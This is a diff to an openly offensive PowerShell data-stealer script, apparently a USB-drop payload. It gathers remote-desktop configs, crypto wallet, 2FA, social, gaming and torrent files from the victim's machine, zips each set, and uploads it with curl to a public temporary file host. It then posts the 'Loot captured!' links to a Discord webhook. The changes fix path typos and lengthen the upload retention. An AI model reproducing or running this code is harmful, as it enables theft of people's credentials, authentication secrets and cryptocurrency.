@@ -110,7 +110,7 @@ if (Test-Path "$env:appdata/../Local/Syncthing/" -PathType Any) {
 Compress-Archive -Path $env:tmp/$FolderName/FTPandFileSync -DestinationPath "$env:tmp/FTPandFileSync-$ZIP"
 
 $text = "**FTPandFileSync**: Loot captured! Here is the URL: "
-$text += curl.exe -F "reqtype=fileupload" -F "time=1h" -F "fileToUpload=@$env:tmp/FTPandFileSync-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/FTPandFileSync-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
 
 $hookurl = "$dc"
 
@@ -129,15 +129,15 @@ Remove-Item "$env:TEMP\FTPandFileSync-$ZIP" -r -Force -ErrorAction SilentlyConti
 New-Item -Path "$env:tmp/$FolderName/RemoteControl" -ItemType Directory
 
 # RustDesk
-if (Test-Path "$env:appdata\RuskDesk\config" -PathType Any) {
+if (Test-Path "$env:appdata\RustDesk\config" -PathType Any) {
 	New-Item -Path $env:tmp/$FolderName/RemoteControl/RustDesk -ItemType Directory
-	Copy-Item "$env:appdata/RuskDesk/config" "$env:tmp/$FolderName/RemoteControl/RustDesk/config" -Recurse
+	Copy-Item "$env:appdata/RustDesk/config" "$env:tmp/$FolderName/RemoteControl/RustDesk/config" -Recurse
 }
 
 # TeamViewer
-if (Test-Path "$env:appdata\..\TeamViewer\Logs" -PathType Any) {
+if (Test-Path "$env:appdata\..\Local\TeamViewer\Logs" -PathType Any) {
 	New-Item -Path $env:tmp/$FolderName/RemoteControl/TeamViewer -ItemType Directory
-	Copy-Item "$env:appdata/../TeamViewer/Logs" "$env:tmp/$FolderName/RemoteControl/TeamViewer/Logs" -Recurse
+	Copy-Item "$env:appdata/../Local/TeamViewer/Logs" "$env:tmp/$FolderName/RemoteControl/TeamViewer/Logs" -Recurse
 }
 
 # AnyDesk
@@ -147,7 +147,7 @@ if (Test-Path "$env:appdata\AnyDesk\connection_trace.txt" -PathType Any) {
 }
 
 # Parsec
-if (Test-Path"$env:appdata/Parsec/log.txt" -PathType Any) {
+if (Test-Path "$env:appdata/Parsec/log.txt" -PathType Any) {
 	New-Item -Path $env:tmp/$FolderName/RemoteControl/Parsec -ItemType Directory
 	Copy-Item "$env:appdata/Parsec/log.txt" "$env:tmp/$FolderName/RemoteControl/Parsec/log.txt"
 }
@@ -155,7 +155,7 @@ if (Test-Path"$env:appdata/Parsec/log.txt" -PathType Any) {
 Compress-Archive -Path $env:tmp/$FolderName/RemoteControl -DestinationPath "$env:tmp/RemoteControl-$ZIP"
 
 $text = "**RemoteControl**: Loot captured! Here is the URL: "
-$text += curl.exe -F "reqtype=fileupload" -F "time=1h" -F "fileToUpload=@$env:tmp/RemoteControl-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/RemoteControl-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
 
 $hookurl = "$dc"
 
@@ -167,7 +167,7 @@ $Body = @{
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
 
 Remove-Item "$env:TEMP\$FolderName\RemoteControl" -r -Force -ErrorAction SilentlyContinue
-Remove-Item "$env:TEMP\RemoteControl-$ZIP" -r -Force -ErrorAction SilentlyContinue
+#Remove-Item "$env:TEMP\RemoteControl-$ZIP" -r -Force -ErrorAction SilentlyContinue
 
 ############################################################################################################################################################
 
@@ -208,7 +208,7 @@ if ($utorrent -ne $null) {
 Compress-Archive -Path $env:tmp/$FolderName/TorrentsAndDownloaders -DestinationPath "$env:tmp/TorrentsAndDownloaders-$ZIP"
 
 $text = "**TorrentsAndDownloaders**: Loot captured! Here is the URL: "
-$text += curl.exe -F "reqtype=fileupload" -F "time=1h" -F "fileToUpload=@$env:tmp/TorrentsAndDownloaders-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/TorrentsAndDownloaders-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
 
 $hookurl = "$dc"
 
@@ -335,7 +335,7 @@ if (Test-Path $path -PathType Any) {
 Compress-Archive -Path $env:tmp/$FolderName/Crypto -DestinationPath "$env:tmp/Crypto-$ZIP"
 
 $text = "**Crypto**: Loot captured! Here is the URL: "
-$text += curl.exe -F "reqtype=fileupload" -F "time=1h" -F "fileToUpload=@$env:tmp/Crypto-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/Crypto-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
 
 $hookurl = "$dc"
 
@@ -382,7 +382,7 @@ if (Test-Path $path -PathType Any) {
 Compress-Archive -Path $env:tmp/$FolderName/2FA -DestinationPath "$env:tmp/2FA-$ZIP"
 
 $text = "**2FA**: Loot captured! Here is the URL: "
-$text += curl.exe -F "reqtype=fileupload" -F "time=1h" -F "fileToUpload=@$env:tmp/2FA-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/2FA-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
 
 $hookurl = "$dc"
 
@@ -415,7 +415,7 @@ if (Test-Path "$env:appdata/../Local/Keybase/config.json" -PathType Any) {
 Compress-Archive -Path $env:tmp/$FolderName/Socials -DestinationPath "$env:tmp/Socials-$ZIP"
 
 $text = "**Socials**: Loot captured! Here is the URL: "
-$text += curl.exe -F "reqtype=fileupload" -F "time=1h" -F "fileToUpload=@$env:tmp/Socials-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/Socials-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
 
 $hookurl = "$dc"
 
@@ -529,7 +529,7 @@ if ($minecraft -ne $null) {
 Compress-Archive -Path $env:tmp/$FolderName/Gaming -DestinationPath "$env:tmp/Gaming-$ZIP"
 
 $text = "**Gaming**: Loot captured! Here is the URL: "
-$text += curl.exe -F "reqtype=fileupload" -F "time=1h" -F "fileToUpload=@$env:tmp/Gaming-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/Gaming-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
 
 $hookurl = "$dc"
 
@@ -556,7 +556,7 @@ tree $env:appdata /a /f >> $env:TEMP\$folderName\Trees\tree-appdata.txt
 Compress-Archive -Path $env:tmp/$FolderName/Trees -DestinationPath "$env:tmp/Trees-$ZIP"
 
 $text = "**Trees**: Loot captured! Here is the URL: "
-$text += curl.exe -F "reqtype=fileupload" -F "time=1h" -F "fileToUpload=@$env:tmp/Trees-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/Trees-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
 
 $hookurl = "$dc"
 
@@ -1533,7 +1533,7 @@ if (-not ([string]::IsNullOrEmpty($db))){dropbox}
 
 # Upload file to temp file storage
 $text = "Loot captured! Here is the URL: "
-$text += curl.exe -F "reqtype=fileupload" -F "time=1h" -F "fileToUpload=@$env:tmp/$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
+$text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
 
 function Upload-Discord {
 
